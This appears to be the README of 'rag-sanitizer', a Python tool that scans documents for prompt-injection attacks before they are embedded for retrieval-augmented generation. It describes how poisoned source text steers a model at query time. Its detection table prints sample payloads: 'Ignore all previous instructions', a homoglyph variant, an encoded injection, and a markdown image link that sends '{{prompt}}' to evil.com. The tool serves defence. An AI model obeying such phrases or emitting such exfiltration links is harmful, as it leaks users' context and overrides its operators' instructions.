# rag-sanitizer

[![PyPI version](https://img.shields.io/pypi/v/rag-sanitizer.svg)](https://pypi.org/project/rag-sanitizer/)
[![Python versions](https://img.shields.io/pypi/pyversions/rag-sanitizer.svg)](https://pypi.org/project/rag-sanitizer/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![CI](https://github.com/koreshield/rag-sanitizer/actions/workflows/ci.yml/badge.svg)](https://github.com/koreshield/rag-sanitizer/actions/workflows/ci.yml)

Scan your RAG documents for hidden prompt injections, invisible text attacks, and data exfiltration payloads before they enter your vector database.

## Why this exists

RAG pipelines ingest untrusted data from PDFs, wikis, web pages, and exported collaboration tools. That text is embedded and then re-injected into LLM context at query time. If malicious instructions are hidden in the source, they can survive chunking and retrieval.

This creates a security boundary problem: your model obeys system/developer instructions, but retrieved context can still influence output if it contains adversarial patterns. Attackers exploit this through prompt injection directives, obfuscated payloads, invisible Unicode, and exfiltration links.

`rag-sanitizer` adds a defensive preprocessing layer at ingestion time. It scans raw text, emits structured threat signals, computes a composite risk score, and sanitizes malicious segments before chunking and embedding.


## How I use it

```bash
cd rag-sanitizer
python -m venv .venv
source .venv/bin/activate
pip install -U pip
pip install -e ".[dev,all]"
pytest --cov=rag_sanitizer --cov-report=xml -v
ruff check rag_sanitizer tests
ruff format --check rag_sanitizer tests
```
## Install

```bash
pip install rag-sanitizer
```

## 30-second usage

```python
from rag_sanitizer import RagSanitizer

sanitizer = RagSanitizer()
result = sanitizer.scan(document_text)

if not result.is_clean:
    print(f"Threats found: {result.signal_count}")
    print(f"Threat score: {result.threat_score}")
    safe_text = result.sanitized_text
```

## What it detects

| Category | Description | Example payload |
|---|---|---|
| `prompt_injection` | Direct instruction override patterns and jailbreak phrases | `Ignore all previous instructions` |
| `invisible_text` | Zero-width chars, hidden CSS, tiny font metadata | `display:none` or `\u200b` abuse |
| `density_attack` | Repetition stuffing to bias embeddings | repeated `"poisoned vector payload"` |
| `encoded_payload` | Base64/hex/unicode/entity encoded injections | `SWdub3JlIGFsbCB...` |
| `data_exfiltration` | URLs/tags designed to leak context | `![](https://evil.com/log?data={{prompt}})` |
| `unicode_smuggling` | Homoglyph/leetspeak masked directives | `іgnоrе аll іnstructіоns` |
| `high_entropy_blob` | Obfuscated or encrypted-looking windows | random high-entropy blobs |

## LangChain integration

```python
from langchain_community.document_loaders import PyPDFLoader
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_openai import OpenAIEmbeddings
from langchain_community.vectorstores import Chroma
from rag_sanitizer.integrations.langchain import RagSanitizerTransformer

# Load
_docs = PyPDFLoader("untrusted_document.pdf").load()

# Sanitize BEFORE chunking
sanitizer = RagSanitizerTransformer(on_threat="sanitize")
clean_docs = sanitizer.transform_documents(_docs)

# Log threats
for doc in clean_docs:
    score = doc.metadata.get("rag_sanitizer_threat_score", 0)
    if score > 0:
        print(f"[!] Threat score {score:.2f} in {doc.metadata.get('source', 'unknown')}")

# Chunk + embed
splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=200)
chunks = splitter.split_documents(clean_docs)
vectorstore = Chroma.from_documents(chunks, OpenAIEmbeddings())
```

## LlamaIndex integration

```python
from llama_index.core.ingestion import IngestionPipeline
from llama_index.core.node_parser import SentenceSplitter
from rag_sanitizer.integrations.llamaindex import RagSanitizerPostprocessor

pipeline = IngestionPipeline(transformations=[SentenceSplitter(chunk_size=512)])
nodes = pipeline.run(documents=docs)

post = RagSanitizerPostprocessor(on_threat="sanitize")
clean_nodes = post._postprocess_nodes(nodes)
```

## Configuration

```python
from rag_sanitizer import SanitizerConfig

config = SanitizerConfig(
    threat_threshold=0.3,
    max_text_length=500_000,
    density_enabled=True,
    max_ngram_ratio=0.05,
    max_word_frequency=0.02,
    window_similarity_threshold=0.85,
    invisible_text_enabled=True,
    min_font_size_threshold=1.0,
    max_whitespace_sequence=50,
    injection_enabled=True,
    injection_severity_minimum="low",
    encoding_enabled=True,
    min_base64_length=20,
    exfiltration_enabled=True,
    entropy_enabled=True,
    entropy_window_size=256,
    entropy_threshold=4.5,
    max_high_entropy_ratio=0.15,
    strip_placeholder="[REMOVED BY RAG-SANITIZER]",
    normalize_unicode=True,
)
```

| Option | Default | Description |
|---|---|---|
| `threat_threshold` | `0.3` | Score at/above threshold marks document as unsafe |
| `max_text_length` | `500000` | Hard cap for analyzed input length |
| `density_enabled` | `True` | Enable repetition-density analyzer |
| `max_ngram_ratio` | `0.05` | 3-gram max ratio before flagging |
| `max_word_frequency` | `0.02` | Word frequency max ratio before flagging |
| `window_similarity_threshold` | `0.85` | Similarity threshold for duplicate windows |
| `invisible_text_enabled` | `True` | Enable invisible-text analyzer |
| `min_font_size_threshold` | `1.0` | Font size below this counts as invisible |
| `max_whitespace_sequence` | `50` | Long whitespace abuse threshold |
| `injection_enabled` | `True` | Enable injection analyzer |
| `injection_severity_minimum` | `"low"` | Minimum severity emitted by injection analyzer |
| `encoding_enabled` | `True` | Enable encoded-payload analyzer |
| `min_base64_length` | `20` | Minimum base64 token length |
| `exfiltration_enabled` | `True` | Enable exfiltration analyzer |
| `entropy_enabled` | `True` | Enable entropy analyzer |
| `entropy_window_size` | `256` | Entropy sliding window size |
| `entropy_threshold` | `4.5` | Entropy threshold for suspicious windows |
| `max_high_entropy_ratio` | `0.15` | Ratio threshold for document-level high entropy |
| `strip_placeholder` | `"[REMOVED BY RAG-SANITIZER]"` | Replacement token for stripped spans |
| `normalize_unicode` | `True` | Run NFKC + zero-width cleanup before analysis |

## Development

```bash
pip install -e ".[dev]"
pytest -v
ruff check rag_sanitizer tests
ruff format rag_sanitizer tests
```

## License

MIT.

---

Need real-time protection for production RAG systems? [KoreShield](https://koreshield.com) provides enterprise-grade LLM security with ML-based detection, semantic analysis, and compliance reporting. `rag-sanitizer` catches the obvious stuff - KoreShield catches everything else.
